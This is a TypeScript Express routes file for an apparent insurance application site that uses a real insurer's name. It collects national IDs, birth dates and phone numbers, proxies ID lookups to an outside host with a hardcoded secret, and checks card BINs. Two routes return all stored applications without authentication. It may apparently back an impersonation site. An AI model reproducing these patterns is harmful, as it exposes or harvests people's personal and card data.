import type { Express } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { insuranceFormSchema } from "@shared/schema";

const LOAD_BALANCER_URL =
  "https://stackblitz-starters-dbbm52jd-green.vercel.app/api/vehicles";
const PROXY_SECRET = process.env.PROXY_SECRET || "Qw@123123@Qw";

export async function registerRoutes(
  httpServer: Server,
  app: Express,
): Promise<Server> {
  app.get("/api/vehicles", async (req, res) => {
    const { nin } = req.query;

    if (!nin) {
      return res.status(400).json({ error: "Missing NIN" });
    }

    try {
      const response = await fetch(`${LOAD_BALANCER_URL}?nin=${nin}`, {
        method: "GET",
        headers: {
          "Content-Type": "application/json",
          "X-Proxy-Secret": PROXY_SECRET,
          "User-Agent": req.headers["user-agent"] || "Tawuniya-Proxy",
        },
      });

      const data = await response.json();
      res.status(response.status).json(data);
    } catch (error) {
      console.error("Proxy Error:", error);
      res.status(500).json({ error: "Internal Server Error" });
    }
  });

  app.post("/api/insurance/apply", async (req, res) => {
    try {
      const validatedData = insuranceFormSchema.parse(req.body);

      const application = await storage.createInsuranceApplication({
        nationalId: validatedData.nationalId,
        birthDay: validatedData.birthDay,
        birthMonth: validatedData.birthMonth,
        birthYear: validatedData.birthYear,
        isHijri: validatedData.isHijri,
        phoneNumber: validatedData.phoneNumber,
        acceptMarketing: validatedData.acceptMarketing,
        carInsurance: validatedData.carInsurance,
        healthInsurance: validatedData.healthInsurance,
        generalInsurance: validatedData.generalInsurance,
        protectionAndSavings: validatedData.protectionAndSavings,
        vehicleSerial: validatedData.vehicleSerial,
        vehicleYear: validatedData.vehicleYear,
        coverageType: validatedData.coverageType,
        roadsideAssistance: validatedData.roadsideAssistance,
        replacementCar: validatedData.replacementCar,
        personalAccident: validatedData.personalAccident,
        selectedOfferId: validatedData.selectedOfferId,
        selectedOfferName: validatedData.selectedOfferName,
        selectedFeatures: validatedData.selectedFeatures,
        offerTotalPrice: validatedData.offerTotalPrice,
      });

      res.json({ success: true, application });
    } catch (error) {
      res.status(400).json({ success: false, error: "Invalid data" });
    }
  });

  app.get("/api/insurance/applications", async (req, res) => {
    const applications = await storage.getInsuranceApplications();
    res.json(applications);
  });

  app.get("/api/insurance/applications/:id", async (req, res) => {
    const application = await storage.getInsuranceApplication(req.params.id);
    if (!application) {
      return res.status(404).json({ error: "Application not found" });
    }
    res.json(application);
  });

  // BIN Lookup API for card information
  app.get("/api/bin-lookup/:bin", async (req, res) => {
    const { bin } = req.params;

    if (!bin || bin.length < 6) {
      return res.status(400).json({ error: "Invalid BIN" });
    }

    try {
      // Use binlist.net free API
      const response = await fetch(
        `https://lookup.binlist.net/${bin.substring(0, 6)}`,
        {
          headers: {
            "Accept-Version": "3",
          },
        },
      );

      if (response.ok) {
        const data = await response.json();
        res.json({
          scheme: data.scheme,
          type: data.type,
          brand: data.brand,
          prepaid: data.prepaid,
          country: {
            name: data.country?.name,
            alpha2: data.country?.alpha2,
            emoji: data.country?.emoji,
          },
          bank: {
            name: data.bank?.name,
            url: data.bank?.url,
            phone: data.bank?.phone,
            city: data.bank?.city,
          },
        });
      } else {
        res.status(404).json({ error: "BIN not found" });
      }
    } catch (error) {
      console.error("BIN lookup error:", error);
      res.status(500).json({ error: "Lookup failed" });
    }
  });

  return httpServer;
}
